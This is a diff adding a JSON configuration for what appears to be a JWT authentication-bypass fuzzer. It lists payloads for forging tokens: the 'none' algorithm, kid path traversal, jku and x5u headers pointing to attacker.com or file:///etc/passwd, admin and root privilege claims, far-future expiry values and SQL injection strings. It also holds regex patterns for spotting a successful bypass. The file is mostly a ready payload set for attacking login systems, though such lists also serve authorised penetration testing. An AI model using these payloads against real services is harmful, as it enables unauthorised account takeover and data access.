@@ -1,0 +1,224 @@
+{
+  "mutation_strategies": {
+    "alg_none": {
+      "description": "Set algorithm to \"none\"",
+      "success_rate": 0.5,
+      "priority": 10
+    },
+    "alg_manipulation": {
+      "description": "Try different algorithms",
+      "success_rate": 0.4,
+      "priority": 9
+    },
+    "signature_bypass": {
+      "description": "Try to bypass signature verification",
+      "success_rate": 0.3,
+      "priority": 8
+    },
+    "header_injection": {
+      "description": "Inject into header parameters",
+      "success_rate": 0.2,
+      "priority": 7
+    },
+    "payload_injection": {
+      "description": "Inject into payload claims",
+      "success_rate": 0.4,
+      "priority": 6
+    },
+    "kid_manipulation": {
+      "description": "Manipulate the \"kid\" parameter",
+      "success_rate": 0.3,
+      "priority": 8
+    },
+    "claim_deletion": {
+      "description": "Delete security-related claims",
+      "success_rate": 0.3,
+      "priority": 5
+    },
+    "claim_addition": {
+      "description": "Add privileged claims",
+      "success_rate": 0.4,
+      "priority": 7
+    },
+    "timestamp_manipulation": {
+      "description": "Manipulate timestamp-related claims",
+      "success_rate": 0.5,
+      "priority": 8
+    }
+  },
+  "header_mutations": {
+    "alg": [
+      "none",
+      "None",
+      "NONE",
+      "HS256",
+      "HS384",
+      "HS512",
+      "RS256",
+      "ES256"
+    ],
+    "typ": [
+      "JWT",
+      "jwt",
+      null
+    ],
+    "kid": [
+      "1",
+      "0",
+      "../../../../../dev/null",
+      "non_existing_key",
+      "file:///dev/null",
+      "sql_injection"
+    ],
+    "jku": [
+      "http://attacker.com/keys.json",
+      "file:///etc/passwd"
+    ],
+    "x5u": [
+      "http://attacker.com/cert.pem",
+      "file:///etc/passwd"
+    ]
+  },
+  "payload_mutations": {
+    "admin": [
+      true,
+      1,
+      "true",
+      "yes"
+    ],
+    "role": [
+      "admin",
+      "administrator",
+      "root",
+      "superuser"
+    ],
+    "privileges": [
+      "admin",
+      "all",
+      "*"
+    ],
+    "isAdmin": [
+      true,
+      1,
+      "true",
+      "yes"
+    ],
+    "is_admin": [
+      true,
+      1,
+      "true",
+      "yes"
+    ],
+    "exp": [
+      null,
+      2524608000,
+      99999999999
+    ],
+    "iat": [
+      null,
+      0,
+      1
+    ],
+    "nbf": [
+      null,
+      0,
+      1
+    ],
+    "sub": [
+      "admin",
+      "root",
+      "administrator",
+      "1",
+      "0"
+    ],
+    "permission": [
+      "admin",
+      "all",
+      "*"
+    ],
+    "scope": [
+      "admin",
+      "admin:*",
+      "*"
+    ]
+  },
+  "algorithm_mutations": [
+    "none",
+    "None",
+    "NONE",
+    "",
+    "HS256",
+    "HS384",
+    "HS512",
+    "RS256",
+    "RS384",
+    "RS512",
+    "ES256",
+    "ES384",
+    "ES512"
+  ],
+  "response_patterns": {
+    "success": [
+      "success",
+      "authenticated",
+      "authorized",
+      "welcome",
+      "admin",
+      "dashboard",
+      "profile",
+      "logged in"
+    ],
+    "error": [
+      "error",
+      "invalid",
+      "failed",
+      "unauthorized",
+      "forbidden",
+      "signature",
+      "expired",
+      "token",
+      "invalid token"
+    ],
+    "sql_error": [
+      "sql",
+      "database",
+      "syntax",
+      "mysql",
+      "postgres",
+      "sqlite"
+    ]
+  },
+  "success_indicators": [
+    {
+      "pattern": "admin.*panel",
+      "weight": 0.9
+    },
+    {
+      "pattern": "dashboard",
+      "weight": 0.8
+    },
+    {
+      "pattern": "welcome.*back",
+      "weight": 0.7
+    },
+    {
+      "pattern": "authenticated.*true",
+      "weight": 0.9
+    },
+    {
+      "pattern": "authorized.*true",
+      "weight": 0.9
+    }
+  ],
+  "learning_rate": 0.1,
+  "max_history_size": 100,
+  "mutation_limit": 50,
+  "payload_injection_strings": [
+    "' OR 1=1 --",
+    "' OR '1'='1",
+    "1' OR '1'='1",
+    "admin' --",
+    "admin'/*",
+    "' UNION SELECT 1,2,3 --"
+  ]
+}
